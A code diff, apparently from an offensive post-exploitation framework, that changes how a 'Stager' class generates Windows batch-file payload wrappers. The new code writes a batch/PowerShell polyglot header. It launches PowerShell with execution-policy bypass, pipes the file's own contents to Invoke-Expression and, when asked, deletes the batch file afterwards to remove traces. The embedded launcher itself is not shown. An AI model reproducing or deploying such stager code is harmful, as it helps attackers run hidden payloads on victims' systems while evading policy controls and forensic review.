@@ -134,11 +134,16 @@ class Stager(object):
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
-            code = "@echo off\n"
-            code += "start /b " + launcher + "\n"
+            # The start to the batch eliminates the batch file command limit. It was taken from here:
+            # https://www.reddit.com/r/PowerShell/comments/gaa2ip/never_write_a_batch_wrapper_again/
 
             if delete.lower() == "true":
                 # code that causes the .bat to delete itself
-                code += "start /b \"\" cmd /c del \"%%~f0\"&exit /b\n"
+                code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & DEL \"%~f0\" & POPD /B\n'
+            else:
+                code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & POPD /B\n'
+            code += launcher + "\n"
+
+
 
             return code
